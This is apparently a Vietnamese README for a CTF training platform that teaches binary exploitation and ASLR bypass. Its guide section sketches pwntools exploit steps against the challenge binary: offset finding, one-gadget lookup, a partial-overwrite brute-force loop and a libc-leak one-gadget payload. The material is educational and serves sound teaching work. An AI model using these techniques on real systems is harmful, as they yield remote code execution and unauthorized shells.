# 🔥 The Phoenix CTF Platform

<div align="center">

**Nền tảng CTF Pwn chuyên sâu về Binary Exploitation và ASLR Bypass**

[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
[![Express](https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white)](https://expressjs.com/)
[![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org/)

</div>

---

## 🎯 Giới Thiệu

**The Phoenix CTF Platform** là một nền tảng học tập và thực hành về Binary Exploitation, đặc biệt tập trung vào các kỹ thuật bypass ASLR (Address Space Layout Randomization). Dự án được xây dựng với mục đích giáo dục, giúp người học hiểu sâu về:

- **Buffer Overflow** và các kỹ thuật khai thác
- **ASLR Bypass** thông qua partial overwrite
- **Return-Oriented Programming (ROP)**
- **One-Gadget RCE** techniques
- **Sigreturn-Oriented Programming (SROP)**
- Các kỹ thuật exploit nâng cao khác

### Đặc Điểm Nổi Bật

🔥 **The Phoenix Challenge** - Binary tự hồi sinh mỗi giây với ASLR mới  
🎓 **Hướng dẫn chi tiết** - 14+ bài học từ cơ bản đến nâng cao  
💡 **7 Template khai thác** - Code mẫu sẵn sàng để học và thực hành  
🛠️ **Payload Generator** - Công cụ tạo payload tự động  
📊 **Theo dõi tiến trình** - Lưu lại lịch sử và thống kê exploit  
🌐 **Hỗ trợ song ngữ** - Tiếng Việt và Tiếng Anh  

---

## ✨ Tính Năng

### 🎯 Core Features

1. **Exploit Builder**
   - Giao diện trực quan để xây dựng exploit
   - Preview payload real-time
   - Kiểm tra và validate syntax
   - Lưu và quản lý nhiều exploit

2. **Payload Generator**
   - **Cyclic Pattern Generator** - Tạo pattern để tìm offset
   - **Partial Overwrite Generator** - Tạo payload bypass ASLR
   - **One-Gadget Helper** - Hỗ trợ tìm và sử dụng one-gadget
   - Export payload ở nhiều định dạng

3. **Templates Library**
   - 7 template khai thác được tối ưu:
     - Partial Overwrite ASLR Bruteforce
     - One-Gadget RCE
     - Adaptive Bruteforce với Crash Oracle
     - SROP (Sigreturn-Oriented Programming)
     - Heap Spray in Stack
     - Timing Attack for Address Leak
     - Multi-Stage Exploitation
   - Documentation chi tiết cho mỗi template
   - Code có thể copy và chạy ngay

4. **One-Gadget Database**
   - Database các one-gadget cho libc phổ biến
   - Filter theo version và architecture
   - Hiển thị constraints và điều kiện sử dụng
   - Cập nhật liên tục

5. **Instructions & Tutorials**
   - 14+ bài học được phân loại:
     - **Overview**: Giới thiệu tổng quan
     - **Theory**: Kiến thức lý thuyết ASLR, Memory Layout
     - **Techniques**: Các kỹ thuật khai thác cụ thể
     - **Walkthrough**: Hướng dẫn từng bước
     - **Resources**: Tài liệu tham khảo
   - Code example cho mỗi bài
   - Giải thích bằng tiếng Việt và tiếng Anh

6. **Flag Submission System**
   - Submit và verify flag
   - Rate limiting để chống bruteforce
   - Lưu lịch sử submission
   - Hiển thị flag chính thức khi giải được

7. **History & Analytics**
   - Theo dõi tất cả các lần thử
   - Thống kê thành công/thất bại
   - Timeline của quá trình khai thác
   - Export dữ liệu để phân tích

### 🎨 UI/UX Features

- ⚡ **Dark/Light Mode** - Chuyển đổi theme mượt mà
- 📱 **Responsive Design** - Hoạt động tốt trên mọi thiết bị
- 🎭 **Animated Transitions** - Giao diện mượt mà, chuyên nghiệp
- 🔍 **Syntax Highlighting** - Highlight code rõ ràng
- 📋 **Copy to Clipboard** - Copy code một click
- 🎉 **Confetti Animation** - Hiệu ứng khi giải được challenge

---

## 🛠️ Công Nghệ Sử Dụng

### Frontend

- **React 18** - UI framework
- **TypeScript** - Type safety
- **Vite** - Build tool & dev server
- **Tailwind CSS** - Styling framework
- **shadcn/ui** - Component library
- **TanStack Query** - Data fetching & caching
- **Wouter** - Lightweight routing
- **Framer Motion** - Animations

### Backend

- **Node.js** - Runtime environment
- **Express** - Web framework
- **TypeScript** - Type safety
- **Zod** - Schema validation
- **Helmet** - Security middleware
- **Express Rate Limit** - Rate limiting

### Security & Validation

- **Zod** - Runtime type checking
- **Helmet** - HTTP security headers
- **Express Rate Limit** - API rate limiting
- **Input Sanitization** - XSS prevention
- **Constant-time comparison** - Timing attack prevention

---

## 💻 Yêu Cầu Hệ Thống

- **Node.js** >= 18.0.0
- **npm** >= 8.0.0 hoặc **yarn** >= 1.22.0
- **RAM** >= 2GB (khuyến nghị 4GB)
- **Disk Space** >= 500MB

---

## 📦 Cài Đặt

### 1. Clone Repository

```bash
git clone https://github.com/F12FLASH/CTF.git
cd CTF/16.The Phoenix
```

### 2. Cài Đặt Dependencies

```bash
npm install
```

hoặc

```bash
yarn install
```

### 3. Chạy Development Server

```bash
npm run dev
```

hoặc

```bash
yarn dev
```

Application sẽ chạy tại `http://localhost:5000`

### 4. Build cho Production

```bash
npm run build
npm start
```

hoặc

```bash
yarn build
yarn start
```

---

## 🚀 Sử Dụng

### Bước 1: Đăng Nhập / Đăng Ký

Mở trình duyệt và truy cập `http://localhost:5000`. Trang web sẽ tự động mở.

### Bước 2: Tìm Hiểu Challenge

1. Vào tab **Instructions** để đọc hướng dẫn
2. Bắt đầu từ phần **Overview** để hiểu về The Phoenix
3. Đọc qua các phần **Theory** và **Techniques**

### Bước 3: Chọn Template

1. Vào tab **Templates**
2. Chọn một template phù hợp (khuyến nghị bắt đầu với "Partial Overwrite")
3. Đọc documentation và copy code

### Bước 4: Tìm Offset

1. Vào tab **Payload Generator**
2. Sử dụng **Cyclic Pattern Generator** để tạo pattern
3. Gửi pattern và tìm crash offset

### Bước 5: Xây Dựng Exploit

1. Vào tab **Exploit Builder**
2. Paste template code vào editor
3. Chỉnh sửa offset và địa chỉ
4. Test và debug

### Bước 6: Lấy One-Gadget

1. Vào tab **Gadgets**
2. Tìm one-gadget phù hợp với libc version
3. Copy địa chỉ và constraints

### Bước 7: Chạy Exploit

1. Chạy exploit script
2. Nếu thành công, bạn sẽ nhận được flag
3. Copy flag

### Bước 8: Submit Flag

1. Vào tab **Submit Flag**
2. Paste flag vào input
3. Click "Submit Flag"
4. Nhận chúc mừng! 🎉

---

## 🔒 Tính Năng Bảo Mật

### 1. Input Validation

- **Zod Schema Validation** - Validate tất cả input từ client
- **Maximum Length Limits** - Giới hạn độ dài input để chống DoS
- **Type Checking** - Runtime type checking với TypeScript + Zod

### 2. Rate Limiting

- **Global API Rate Limit** - 100 requests/15 phút cho tất cả API
- **Flag Submission Rate Limit** - 10 attempts/phút cho flag submission
- **Automatic Cleanup** - Tự động xóa expired attempts

### 3. Security Headers

- **Helmet** - Security headers (CSP, X-Frame-Options, etc.)
- **CORS Protection** - Giới hạn cross-origin requests
- **XSS Prevention** - Content Security Policy

### 4. Flag Protection

- **Multi-layer Encryption** - Flag được encrypt nhiều lớp
- **Constant-time Comparison** - Chống timing attacks
- **Input Normalization** - Loại bỏ zero-width chars, normalize whitespace

### 5. Error Handling

- **Production Error Masking** - Ẩn stack traces trong production
- **Comprehensive Logging** - Log tất cả errors để debug
- **Graceful Degradation** - Xử lý lỗi một cách mượt mà

---

## 📚 API Documentation

### Exploit Attempts

#### `POST /api/attempts`

Tạo một exploit attempt mới.

**Request Body:**
```json
{
  "payload": "b\"A\" * 264 + p64(0x7fff12345678)",
  "payloadPreview": "AAAA...\\x78\\x56\\x34\\x12",
  "result": "Shell obtained",
  "duration": 1234,
  "status": "success"
}
```

**Response:**
```json
{
  "id": "uuid",
  "timestamp": "2025-01-01T00:00:00.000Z",
  "payload": "...",
  "result": "Shell obtained",
  "status": "success"
}
```

#### `GET /api/attempts`

Lấy danh sách tất cả attempts.

**Response:**
```json
[
  {
    "id": "uuid",
    "timestamp": "2025-01-01T00:00:00.000Z",
    "payloadPreview": "AAAA...",
    "result": "Shell obtained",
    "status": "success"
  }
]
```

### Flag Submission

#### `POST /api/flags/submit`

Submit flag để verify.

**Request Body:**
```json
{
  "flag": "VNFLAG{...}"
}
```

**Response (Success):**
```json
{
  "correct": true,
  "flag": "VNFLAG{...}",
  "message": "Congratulations! You've solved the challenge!",
  "messageVi": "Chúc mừng! Bạn đã giải được thử thách!",
  "solvedAt": "2025-01-01T00:00:00.000Z"
}
```

**Response (Failed):**
```json
{
  "correct": false,
  "message": "Incorrect flag. Keep trying!",
  "messageVi": "Flag không đúng. Hãy thử lại!"
}
```

### Templates

#### `GET /api/templates`

Lấy tất cả exploit templates.

**Response:**
```json
[
  {
    "id": "uuid",
    "name": "Partial Overwrite ASLR",
    "description": "ASLR bruteforce using partial address overwrite",
    "difficulty": 5,
    "category": "Buffer Overflow",
    "code": "#!/usr/bin/env python3\n...",
    "documentation": "Detailed explanation..."
  }
]
```

### One-Gadgets

#### `GET /api/gadgets?libcVersion=2.27-3ubuntu1`

Lấy one-gadgets theo libc version.

**Response:**
```json
[
  {
    "id": "uuid",
    "address": "0x45216",
    "constraints": "[rsp+0x30] == NULL",
    "libcVersion": "2.27-3ubuntu1",
    "architecture": "x86_64"
  }
]
```

---

## 🎓 Hướng Dẫn Khai Thác

### Kịch Bản 1: Partial Overwrite ASLR

1. **Tìm Offset**
   ```python
   from pwn import *
   cyclic(1000)  # Tạo pattern
   # Crash tại offset 264
   ```

2. **Xác Định Libc Version**
   ```bash
   ldd ./phoenix
   # libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
   ```

3. **Tìm One-Gadget**
   ```bash
   one_gadget /lib/x86_64-linux-gnu/libc.so.6
   # 0x45216 execve("/bin/sh", rsp+0x30, environ)
   ```

4. **Bruteforce ASLR**
   ```python
   for i in range(0x1000):
       payload = b"A" * 264 + p16(i)
       # Gửi payload và check shell
   ```

### Kịch Bản 2: One-Gadget RCE

1. **Leak Libc Address**
   ```python
   # Sử dụng format string hoặc info leak
   libc_leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
   libc_base = libc_leak - 0x21b97  # Offset đến __libc_start_main
   ```

2. **Calculate One-Gadget Address**
   ```python
   one_gadget = libc_base + 0x45216
   ```

3. **Trigger Exploit**
   ```python
   payload = b"A" * 264 + p64(one_gadget)
   p.sendline(payload)
   p.interactive()
   ```

---

## 🐛 Troubleshooting

### Vấn Đề: Application không start

**Nguyên nhân:** Port 5000 đã được sử dụng

**Giải pháp:**
```bash
# Kiểm tra port đang sử dụng
lsof -i :5000

# Kill process
kill -9 <PID>

# Hoặc đổi port trong package.json
PORT=3000 npm run dev
```

### Vấn Đề: "Too many requests"

**Nguyên nhân:** Rate limit

**Giải pháp:** Đợi 15 phút hoặc restart server (chỉ trong development)

### Vấn Đề: LSP/TypeScript errors

**Nguyên nhân:** Dependencies chưa được install đúng

**Giải pháp:**
```bash
rm -rf node_modules package-lock.json
npm install
```

### Vấn Đề: Flag đúng nhưng báo sai

**Nguyên nhân:** 
- Có khoảng trắng thừa
- Copy nhầm format
- Zero-width characters

**Giải pháp:**
- Trim khoảng trắng
- Copy lại flag cẩn thận
- Paste vào text editor để check

---

## 🤝 Đóng Góp

Chúng tôi rất hoan nghênh mọi đóng góp! 

### Cách Đóng Góp

1. Fork repository
2. Tạo branch mới (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Mở Pull Request

### Quy Tắc Đóng Góp

- Code phải pass TypeScript type checking
- Follow existing code style
- Viết comment rõ ràng
- Test kỹ trước khi submit PR
- Viết commit message có ý nghĩa

---

## 📄 License

Distributed under the MIT License. See `LICENSE` for more information.

---

## 🙏 Credits & Acknowledgments

- **The Phoenix Challenge** - Inspired by binary exploitation challenges
- **shadcn/ui** - Beautiful UI components
- **Tailwind CSS** - Utility-first CSS framework
- Cộng đồng CTF Việt Nam

---

## 📧 Liên Hệ

-Email: loideveloper.37@gmail.com

---

<div align="center">

**Made with ❤️ for the CTF Community**

⭐ Nếu project này hữu ích, đừng quên cho một star nhé! ⭐

</div>
